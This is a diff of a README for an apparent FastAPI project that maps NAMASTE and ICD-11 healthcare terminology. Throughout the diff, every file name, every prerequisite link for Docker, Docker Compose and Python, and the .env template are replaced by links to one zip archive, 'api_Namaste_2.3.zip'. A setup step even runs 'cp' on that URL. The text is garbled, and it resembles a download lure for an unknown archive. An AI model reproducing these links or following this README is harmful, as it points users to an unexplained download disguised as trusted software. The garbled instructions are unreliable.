@@ -14,50 +14,50 @@ This project provides a FastAPI-based API to integrate and map healthcare termin
 
 healthcare_api_project/
 ├── app/
-│   ├── https://github.com/Amrit7679/Namaste-api/raw/refs/heads/main/app/api_Namaste_2.3.zip
+│   ├── https://raw.githubusercontent.com/Amrit7679/Namaste-api/main/app/api_Namaste_2.3.zip
 │   ├── api/
-│   │   ├── https://github.com/Amrit7679/Namaste-api/raw/refs/heads/main/app/api_Namaste_2.3.zip
+│   │   ├── https://raw.githubusercontent.com/Amrit7679/Namaste-api/main/app/api_Namaste_2.3.zip
 │   │   ├── endpoints/       # API route handlers
-│   │   │   ├── https://github.com/Amrit7679/Namaste-api/raw/refs/heads/main/app/api_Namaste_2.3.zip
-│   │   │   ├── https://github.com/Amrit7679/Namaste-api/raw/refs/heads/main/app/api_Namaste_2.3.zip
-│   │   │   ├── https://github.com/Amrit7679/Namaste-api/raw/refs/heads/main/app/api_Namaste_2.3.zip
-│   │   │   ├── https://github.com/Amrit7679/Namaste-api/raw/refs/heads/main/app/api_Namaste_2.3.zip
-│   │   │   ├── https://github.com/Amrit7679/Namaste-api/raw/refs/heads/main/app/api_Namaste_2.3.zip
-│   │   │   └── https://github.com/Amrit7679/Namaste-api/raw/refs/heads/main/app/api_Namaste_2.3.zip
-│   │   │   └── https://github.com/Amrit7679/Namaste-api/raw/refs/heads/main/app/api_Namaste_2.3.zip
+│   │   │   ├── https://raw.githubusercontent.com/Amrit7679/Namaste-api/main/app/api_Namaste_2.3.zip
+│   │   │   ├── https://raw.githubusercontent.com/Amrit7679/Namaste-api/main/app/api_Namaste_2.3.zip
+│   │   │   ├── https://raw.githubusercontent.com/Amrit7679/Namaste-api/main/app/api_Namaste_2.3.zip
+│   │   │   ├── https://raw.githubusercontent.com/Amrit7679/Namaste-api/main/app/api_Namaste_2.3.zip
+│   │   │   ├── https://raw.githubusercontent.com/Amrit7679/Namaste-api/main/app/api_Namaste_2.3.zip
+│   │   │   └── https://raw.githubusercontent.com/Amrit7679/Namaste-api/main/app/api_Namaste_2.3.zip
+│   │   │   └── https://raw.githubusercontent.com/Amrit7679/Namaste-api/main/app/api_Namaste_2.3.zip
 │   │   ├── models/          # Pydantic data models
-│   │   │   ├── https://github.com/Amrit7679/Namaste-api/raw/refs/heads/main/app/api_Namaste_2.3.zip
-│   │   │   ├── https://github.com/Amrit7679/Namaste-api/raw/refs/heads/main/app/api_Namaste_2.3.zip
-│   │   │   └── https://github.com/Amrit7679/Namaste-api/raw/refs/heads/main/app/api_Namaste_2.3.zip
+│   │   │   ├── https://raw.githubusercontent.com/Amrit7679/Namaste-api/main/app/api_Namaste_2.3.zip
+│   │   │   ├── https://raw.githubusercontent.com/Amrit7679/Namaste-api/main/app/api_Namaste_2.3.zip
+│   │   │   └── https://raw.githubusercontent.com/Amrit7679/Namaste-api/main/app/api_Namaste_2.3.zip
 │   │   └── services/        # Business logic and external integrations
-│   │       ├── https://github.com/Amrit7679/Namaste-api/raw/refs/heads/main/app/api_Namaste_2.3.zip
-│   │       ├── https://github.com/Amrit7679/Namaste-api/raw/refs/heads/main/app/api_Namaste_2.3.zip
-│   │       ├── https://github.com/Amrit7679/Namaste-api/raw/refs/heads/main/app/api_Namaste_2.3.zip
-│   │       ├── https://github.com/Amrit7679/Namaste-api/raw/refs/heads/main/app/api_Namaste_2.3.zip
-│   │       └── https://github.com/Amrit7679/Namaste-api/raw/refs/heads/main/app/api_Namaste_2.3.zip
+│   │       ├── https://raw.githubusercontent.com/Amrit7679/Namaste-api/main/app/api_Namaste_2.3.zip
+│   │       ├── https://raw.githubusercontent.com/Amrit7679/Namaste-api/main/app/api_Namaste_2.3.zip
+│   │       ├── https://raw.githubusercontent.com/Amrit7679/Namaste-api/main/app/api_Namaste_2.3.zip
+│   │       ├── https://raw.githubusercontent.com/Amrit7679/Namaste-api/main/app/api_Namaste_2.3.zip
+│   │       └── https://raw.githubusercontent.com/Amrit7679/Namaste-api/main/app/api_Namaste_2.3.zip
 │   ├── core/                # Core configurations and utilities
-│   │   ├── https://github.com/Amrit7679/Namaste-api/raw/refs/heads/main/app/api_Namaste_2.3.zip
-│   │   └── https://github.com/Amrit7679/Namaste-api/raw/refs/heads/main/app/api_Namaste_2.3.zip
-│   └── https://github.com/Amrit7679/Namaste-api/raw/refs/heads/main/app/api_Namaste_2.3.zip              # FastAPI application entry point
+│   │   ├── https://raw.githubusercontent.com/Amrit7679/Namaste-api/main/app/api_Namaste_2.3.zip
+│   │   └── https://raw.githubusercontent.com/Amrit7679/Namaste-api/main/app/api_Namaste_2.3.zip
+│   └── https://raw.githubusercontent.com/Amrit7679/Namaste-api/main/app/api_Namaste_2.3.zip              # FastAPI application entry point
 ├── data/                    # Local data files (e.g., for NAMASTE)
-│   ├── https://github.com/Amrit7679/Namaste-api/raw/refs/heads/main/app/api_Namaste_2.3.zip
-│   └── https://github.com/Amrit7679/Namaste-api/raw/refs/heads/main/app/api_Namaste_2.3.zip
+│   ├── https://raw.githubusercontent.com/Amrit7679/Namaste-api/main/app/api_Namaste_2.3.zip
+│   └── https://raw.githubusercontent.com/Amrit7679/Namaste-api/main/app/api_Namaste_2.3.zip
 ├── tests/                   # Unit and integration tests
-│   ├── https://github.com/Amrit7679/Namaste-api/raw/refs/heads/main/app/api_Namaste_2.3.zip
+│   ├── https://raw.githubusercontent.com/Amrit7679/Namaste-api/main/app/api_Namaste_2.3.zip
 │   └── ...
-├── https://github.com/Amrit7679/Namaste-api/raw/refs/heads/main/app/api_Namaste_2.3.zip             # Environment variable configuration template
-├── https://github.com/Amrit7679/Namaste-api/raw/refs/heads/main/app/api_Namaste_2.3.zip       # Docker Compose for running services
+├── https://raw.githubusercontent.com/Amrit7679/Namaste-api/main/app/api_Namaste_2.3.zip             # Environment variable configuration template
+├── https://raw.githubusercontent.com/Amrit7679/Namaste-api/main/app/api_Namaste_2.3.zip       # Docker Compose for running services
 ├── Dockerfile               # Dockerfile for building the API image
-├── https://github.com/Amrit7679/Namaste-api/raw/refs/heads/main/app/api_Namaste_2.3.zip         # Python dependencies
-└── https://github.com/Amrit7679/Namaste-api/raw/refs/heads/main/app/api_Namaste_2.3.zip                # This file
+├── https://raw.githubusercontent.com/Amrit7679/Namaste-api/main/app/api_Namaste_2.3.zip         # Python dependencies
+└── https://raw.githubusercontent.com/Amrit7679/Namaste-api/main/app/api_Namaste_2.3.zip                # This file
 
 ## Setup and Running
 
 ### Prerequisites
 
-*   [Docker](https://github.com/Amrit7679/Namaste-api/raw/refs/heads/main/app/api_Namaste_2.3.zip)
-*   [Docker Compose](https://github.com/Amrit7679/Namaste-api/raw/refs/heads/main/app/api_Namaste_2.3.zip)
-*   [Python 3.7+](https://github.com/Amrit7679/Namaste-api/raw/refs/heads/main/app/api_Namaste_2.3.zip)
+*   [Docker](https://raw.githubusercontent.com/Amrit7679/Namaste-api/main/app/api_Namaste_2.3.zip)
+*   [Docker Compose](https://raw.githubusercontent.com/Amrit7679/Namaste-api/main/app/api_Namaste_2.3.zip)
+*   [Python 3.7+](https://raw.githubusercontent.com/Amrit7679/Namaste-api/main/app/api_Namaste_2.3.zip)
 
 ### Steps
 
@@ -68,9 +68,9 @@ healthcare_api_project/
     ```
 
 2.  **Create a `.env` file**:
-    Copy the `https://github.com/Amrit7679/Namaste-api/raw/refs/heads/main/app/api_Namaste_2.3.zip` file and rename it to `.env`.
+    Copy the `https://raw.githubusercontent.com/Amrit7679/Namaste-api/main/app/api_Namaste_2.3.zip` file and rename it to `.env`.
     ```bash
-    cp https://github.com/Amrit7679/Namaste-api/raw/refs/heads/main/app/api_Namaste_2.3.zip .env
+    cp https://raw.githubusercontent.com/Amrit7679/Namaste-api/main/app/api_Namaste_2.3.zip .env
     ```
     Edit the `.env` file to add your ICD-11 API credentials and any other necessary configurations.
 
@@ -92,7 +92,7 @@ healthcare_api_project/
 
 ## Development Notes
 
-*   **NAMASTE Data**: The `NAMASTEService` currently reads from a local `https://github.com/Amrit7679/Namaste-api/raw/refs/heads/main/app/api_Namaste_2.3.zip` file. Ensure this file is populated with relevant data.
+*   **NAMASTE Data**: The `NAMASTEService` currently reads from a local `https://raw.githubusercontent.com/Amrit7679/Namaste-api/main/app/api_Namaste_2.3.zip` file. Ensure this file is populated with relevant data.
 *   **ICD-11 API Credentials**: You must obtain and set `ICD11_CLIENT_ID` and `ICD11_CLIENT_SECRET` in your `.env` file for the ICD-11 integration to work.
 *   **Error Handling**: Basic error handling is implemented, but can be further enhanced.
 *   **Logging**: Logging is configured to `INFO` level by default.
